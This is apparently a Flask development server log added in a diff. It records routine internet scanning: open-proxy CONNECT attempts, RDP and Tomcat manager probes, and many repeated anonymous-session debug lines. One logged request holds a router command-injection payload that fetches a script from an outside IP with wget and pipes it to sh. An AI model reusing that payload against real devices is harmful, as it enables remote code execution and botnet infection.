+80.75.212.9 - - [20/Sep/2024 04:42:09] "[33mCONNECT dev.flood.at:443 HTTP/1.1[0m" 404 -
+80.75.212.9 - - [20/Sep/2024 04:52:54] code 400, message Bad request syntax ('\x05\x01\x00')
+80.75.212.9 - - [20/Sep/2024 04:52:54] "[31m[1m\x05\x01\x00[0m" 400 -
+79.124.56.202 - - [20/Sep/2024 05:03:35] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.56.202 - - [20/Sep/2024 05:03:35] "[31m[1m\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr[0m" 400 -
+198.235.24.65 - - [20/Sep/2024 05:23:05] "[32mGET / HTTP/1.0[0m" 302 -
+45.95.147.219 - - [20/Sep/2024 05:32:48] "[32mGET http://ident.me/ HTTP/1.1[0m" 302 -
+193.111.248.54 - - [20/Sep/2024 05:32:52] "[33mGET /script HTTP/1.1[0m" 404 -
+95.214.55.43 - - [20/Sep/2024 05:53:28] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.17.169/t|sh;`) HTTP/1.1[0m" 404 -
+140.179.16.60 - - [20/Sep/2024 06:17:24] "[32mGET / HTTP/1.1[0m" 302 -
+140.179.16.60 - - [20/Sep/2024 06:17:24] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+140.179.16.60 - - [20/Sep/2024 06:17:24] "GET /login?next=//sitemap.xml HTTP/1.1" 200 -
+140.179.16.60 - - [20/Sep/2024 06:17:24] "GET /login?next=//robots.txt HTTP/1.1" 200 -
+140.179.16.60 - - [20/Sep/2024 06:17:25] "GET /login?next=/ HTTP/1.1" 200 -
+140.179.16.60 - - [20/Sep/2024 06:17:25] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+140.179.16.60 - - [20/Sep/2024 06:17:25] "GET /login?next=//sitemap.xml HTTP/1.1" 200 -
+140.179.16.60 - - [20/Sep/2024 06:17:25] "GET /login?next=//robots.txt HTTP/1.1" 200 -
+185.249.225.89 - - [20/Sep/2024 06:18:43] "[33mCONNECT codeforces.com:443 HTTP/1.1[0m" 404 -
+167.172.151.104 - - [20/Sep/2024 06:30:42] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+154.213.184.25 - - [20/Sep/2024 06:32:47] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b5990>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b7d10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984ab910>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846e550>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848fd50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984906d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848f490>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a9a90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984aa2d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a9010>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984bc210>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984906d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98444e90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a8c90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9847bc10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846ef10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984aad90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848b1d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b50d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b70d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b5e10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b7850>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984be290>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984bdf90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984bf090>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984bfb90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846cf50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b5890>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b6a10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b7850>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a9d10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a9450>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984442d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98488f10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848d950>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e983e7390>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98490a10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984be050>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e983e75d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98492fd0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848bd50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a9ad0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984906d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a9e10>
+154.213.184.25 - - [20/Sep/2024 07:11:34] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+137.184.217.116 - - [20/Sep/2024 07:16:53] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+45.95.147.219 - - [20/Sep/2024 07:32:44] "[32mGET http://ident.me/ HTTP/1.1[0m" 302 -
+167.172.158.45 - - [20/Sep/2024 07:55:58] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+95.214.27.169 - - [20/Sep/2024 08:47:34] "[32mGET http://example.com/ HTTP/1.1[0m" 302 -
+95.214.27.169 - - [20/Sep/2024 08:47:35] "GET http://example.com/login?next=/ HTTP/1.1" 200 -
+95.214.27.169 - - [20/Sep/2024 08:47:35] "[33mCONNECT example.com:443 HTTP/1.1[0m" 404 -
+95.214.27.169 - - [20/Sep/2024 08:47:36] "[32mGET http://example.com/ HTTP/1.1[0m" 302 -
+95.214.27.169 - - [20/Sep/2024 08:47:36] "GET http://example.com/login?next=/ HTTP/1.1" 200 -
+95.214.27.169 - - [20/Sep/2024 08:47:37] "[33mCONNECT example.com:443 HTTP/1.1[0m" 404 -
+154.213.184.25 - - [20/Sep/2024 09:19:22] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
